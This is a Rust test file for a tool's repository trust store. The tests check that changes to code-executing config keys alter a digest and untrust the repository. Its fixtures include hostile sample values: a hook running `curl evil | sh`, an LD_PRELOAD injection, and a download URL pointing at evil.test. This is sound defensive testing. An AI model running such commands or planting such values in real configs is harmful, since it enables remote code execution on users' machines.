use std::path::Path;

use super::keys::{digest, exec_entries, strip};
use super::*;

fn table(text: &str) -> toml::Table {
    toml::from_str(text).expect("fixture parses")
}

fn digest_of(text: &str) -> String {
    let root = Path::new("/repo");
    digest(root, root, &exec_entries(&table(text)))
}

const BASE: &str = r#"
[defaults]
line_length = 100

[tools.shfmt]
enabled = true
bin = "/opt/shfmt"
args = ["-i", "2"]
extra_args = ["-s"]
format_extra_args = ["-w"]
lint_extra_args = ["-d"]
root = "scripts"
url = "https://example.test/shfmt"
sha256 = "ab"
new_from_rev = "main"

[tools.shfmt.env]
GOFLAGS = "-mod=mod"

[hooks.pre-commit.commands.x]
run = "true"

[cache]
dir = "/tmp/c"

[cache.sccache]
dir = "/tmp/s"
bin = "./sccache"

[lint.javascript.oxc]
js_plugins = "external"

[engines.oxc.format]
external = true
"#;

#[test]
fn every_exec_capable_key_is_an_entry() {
    let names: Vec<String> = exec_entries(&table(BASE)).iter().map(|entry| entry.display()).collect();
    assert_eq!(
        names,
        [
            "cache.dir",
            "cache.sccache.bin",
            "cache.sccache.dir",
            "engines.oxc.format.external",
            "hooks",
            "lint.javascript.oxc.js_plugins",
            "tools.shfmt.args",
            "tools.shfmt.bin",
            "tools.shfmt.env",
            "tools.shfmt.extra_args",
            "tools.shfmt.format_extra_args",
            "tools.shfmt.lint_extra_args",
            "tools.shfmt.new_from_rev",
            "tools.shfmt.root",
            "tools.shfmt.sha256",
            "tools.shfmt.url",
        ]
    );
}

#[test]
fn a_config_without_exec_keys_has_no_entries() {
    let text = "[defaults]\nline_length = 99\n[tools.shfmt]\nenabled = true\nbin = \"shfmt\"\ninstall = \"auto\"\n\
                [lint.javascript.oxc]\nselect = [\"x\"]\n[cache]\nenabled = false\n";
    assert!(exec_entries(&table(text)).is_empty());
}

#[test]
fn a_bare_bin_is_not_gated_but_a_path_is() {
    assert!(is_bare_program("shfmt"));
    assert!(!is_bare_program("./shfmt"));
    assert!(!is_bare_program("bin/shfmt"));
    assert!(!is_bare_program("C:\\tools\\shfmt.exe"));
    assert!(!is_bare_program(""));
}

#[test]
fn the_digest_is_stable_across_key_order_and_unrelated_keys() {
    let reordered = BASE.replace(
        "[defaults]\nline_length = 100\n",
        "[defaults]\nline_length = 80\nfinal_newline = false\n",
    );
    assert_eq!(digest_of(BASE), digest_of(&reordered));
    let env_reordered = BASE.replace(
        "[tools.shfmt.env]\nGOFLAGS = \"-mod=mod\"\n",
        "[tools.shfmt.env]\nB = \"2\"\nA = \"1\"\n",
    );
    let env_sorted = BASE.replace(
        "[tools.shfmt.env]\nGOFLAGS = \"-mod=mod\"\n",
        "[tools.shfmt.env]\nA = \"1\"\nB = \"2\"\n",
    );
    assert_eq!(digest_of(&env_reordered), digest_of(&env_sorted));
}

#[test]
fn the_digest_changes_when_any_exec_key_changes() {
    let original = digest_of(BASE);
    for (from, to) in [
        ("bin = \"/opt/shfmt\"", "bin = \"/opt/evil\""),
        ("args = [\"-i\", \"2\"]", "args = [\"-i\", \"4\"]"),
        ("extra_args = [\"-s\"]", "extra_args = [\"-s\", \"-x\"]"),
        ("format_extra_args = [\"-w\"]", "format_extra_args = []"),
        ("lint_extra_args = [\"-d\"]", "lint_extra_args = [\"-e\"]"),
        ("root = \"scripts\"", "root = \"../scripts\""),
        (
            "url = \"https://example.test/shfmt\"",
            "url = \"https://evil.test/shfmt\"",
        ),
        ("sha256 = \"ab\"", "sha256 = \"cd\""),
        ("new_from_rev = \"main\"", "new_from_rev = \"HEAD~1\""),
        ("GOFLAGS = \"-mod=mod\"", "LD_PRELOAD = \"/tmp/x.so\""),
        ("run = \"true\"", "run = \"curl evil | sh\""),
        ("dir = \"/tmp/c\"", "dir = \"/tmp/d\""),
        ("dir = \"/tmp/s\"", "dir = \"/tmp/t\""),
        ("bin = \"./sccache\"", "bin = \"./other\""),
        ("js_plugins = \"external\"", "js_plugins = \"internal\""),
        ("external = true", "external = false"),
    ] {
        assert!(BASE.contains(from), "fixture lacks {from}");
        let changed = BASE.replacen(from, to, 1);
        assert_ne!(
            digest_of(&changed),
            original,
            "changing `{from}` must change the digest"
        );
    }
}

#[test]
fn the_digest_binds_the_config_directory() {
    let entries = exec_entries(&table(BASE));
    let root = Path::new("/repo");
    assert_ne!(digest(root, root, &entries), digest(root, &root.join("sub"), &entries));
}

#[test]
fn adding_an_exec_key_changes_the_digest() {
    let with_hooks = "[hooks.pre-commit.commands.x]\nrun = \"true\"\n";
    let with_more = format!("{with_hooks}[tools.shfmt]\nenv = {{ PATH = \"/tmp\" }}\n");
    assert_ne!(digest_of(with_hooks), digest_of(&with_more));
}

#[test]
fn strip_removes_every_entry_but_keeps_hooks() {
    let mut stripped = table(BASE);
    let entries = exec_entries(&stripped);
    strip(&mut stripped, &entries);
    assert!(exec_entries(&stripped).iter().all(keys::Entry::is_hooks));
    let shfmt = stripped["tools"]["shfmt"].as_table().expect("tool table kept");
    assert_eq!(shfmt.get("enabled").and_then(toml::Value::as_bool), Some(true));
    assert!(shfmt.get("bin").is_none() && shfmt.get("env").is_none() && shfmt.get("url").is_none());
    assert!(stripped.get("hooks").is_some(), "hooks stay, withheld");
    assert!(stripped["cache"].get("dir").is_none());
    assert_eq!(stripped["defaults"]["line_length"].as_integer(), Some(100));
}

#[test]
fn a_saved_store_round_trips() {
    let dir = tempfile::tempdir().expect("tempdir");
    let home = dir.path().join("poly");
    let mut store = TrustStore::default();
    let record = RepoTrust {
        digests: ["abc".to_owned()].into(),
        extends: ["/shared/base.toml".to_owned()].into(),
        trusted_at: 7,
    };
    store.insert(Path::new("/repo"), record.clone());
    store.save_to(&home).expect("save");
    let loaded = TrustStore::load_from(&home).expect("load");
    assert_eq!(loaded.get(Path::new("/repo")), Some(&record));
    assert!(loaded.allows_extends(Path::new("/shared/base.toml")));
    assert!(!loaded.allows_extends(Path::new("/etc/passwd")));
    let mut revoked = loaded;
    assert!(revoked.remove(Path::new("/repo")));
    assert!(revoked.get(Path::new("/repo")).is_none());
}

#[test]
fn a_missing_store_is_empty() {
    let dir = tempfile::tempdir().expect("tempdir");
    let store = TrustStore::load_from(dir.path()).expect("empty");
    assert_eq!(store.iter().count(), 0);
}

#[cfg(unix)]
mod unix {
    use std::os::unix::fs::PermissionsExt;

    use super::*;

    #[test]
    fn the_store_file_is_owner_only_and_the_directory_private() {
        let dir = tempfile::tempdir().expect("tempdir");
        let home = dir.path().join("poly");
        TrustStore::default().save_to(&home).expect("save");
        let file_mode = std::fs::metadata(home.join("trust.json")).unwrap().permissions().mode();
        assert_eq!(file_mode & 0o077, 0, "{file_mode:o}");
        let dir_mode = std::fs::metadata(&home).unwrap().permissions().mode();
        assert_eq!(dir_mode & 0o077, 0, "{dir_mode:o}");
    }

    #[test]
    fn a_group_or_world_writable_store_directory_is_refused() {
        for mode in [0o777, 0o770, 0o722] {
            let dir = tempfile::tempdir().expect("tempdir");
            TrustStore::default().save_to(dir.path()).expect("save");
            std::fs::set_permissions(dir.path(), std::fs::Permissions::from_mode(mode)).unwrap();
            let error = TrustStore::load_from(dir.path()).expect_err("refused");
            assert!(
                format!("{error:#}").contains("writable by group or others"),
                "{error:#}"
            );
            assert!(
                TrustStore::default().save_to(dir.path()).is_err(),
                "a save must be refused too"
            );
        }
    }

    #[test]
    fn a_store_directory_owned_by_another_user_is_refused() {
        assert!(store::violation(0o700, 0, 1000).unwrap().contains("not owned"));
        assert!(store::violation(0o755, 1000, 1000).is_none());
        assert!(store::violation(0o775, 1000, 1000).unwrap().contains("writable"));
    }
}

#[test]
fn an_assessment_records_digests_that_trust_it_and_nothing_else() {
    let repo = tempfile::tempdir().expect("tempdir");
    std::fs::create_dir(repo.path().join(".git")).unwrap();
    std::fs::create_dir(repo.path().join("sub")).unwrap();
    std::fs::write(
        repo.path().join("poly.toml"),
        "[tools.shfmt]\nenabled = true\nbin = \"/opt/shfmt\"\n",
    )
    .unwrap();
    std::fs::write(repo.path().join("sub/poly.toml"), "[defaults]\nline_length = 80\n").unwrap();
    let root = trust_root(repo.path());
    let dirs = [repo.path().to_path_buf(), repo.path().join("sub")];
    let resolver = crate::LocalPathResolver;
    let assessment = assess(&root, &dirs, &resolver).expect("assess");
    assert_eq!(assessment.configs[0].keys, ["tools.shfmt.bin"]);
    // The nested config inherits the root's `bin`, so it carries a digest of its own.
    assert_eq!(assessment.configs[1].keys, ["tools.shfmt.bin"]);
    assert!(!assessment.is_trusted_by(None));
    let record = assessment.record(1);
    assert!(assessment.is_trusted_by(Some(&record)));

    std::fs::write(
        repo.path().join("poly.toml"),
        "[tools.shfmt]\nenabled = true\nbin = \"/opt/evil\"\n",
    )
    .unwrap();
    let changed = assess(&root, &dirs, &resolver).expect("assess");
    assert!(
        !changed.is_trusted_by(Some(&record)),
        "a changed `bin` must untrust the repository"
    );
}

#[test]
fn an_extends_base_outside_the_repository_is_collected_by_an_assessment() {
    let outside = tempfile::tempdir().expect("tempdir");
    std::fs::write(outside.path().join("base.toml"), "[defaults]\nline_length = 90\n").unwrap();
    let repo = tempfile::tempdir().expect("tempdir");
    std::fs::create_dir(repo.path().join(".git")).unwrap();
    let base = outside.path().join("base.toml");
    std::fs::write(
        repo.path().join("poly.toml"),
        format!("extends = [{:?}]\n", base.to_string_lossy()),
    )
    .unwrap();
    let root = trust_root(repo.path());
    let assessment = assess(&root, &[repo.path().to_path_buf()], &crate::LocalPathResolver).expect("assess");
    let canonical_base = canonical(&base).to_string_lossy().into_owned();
    assert!(assessment.extends_outside.contains(&canonical_base), "{assessment:?}");
    assert!(!assessment.is_trusted_by(None));
    assert!(assessment.is_trusted_by(Some(&assessment.record(0))));
}
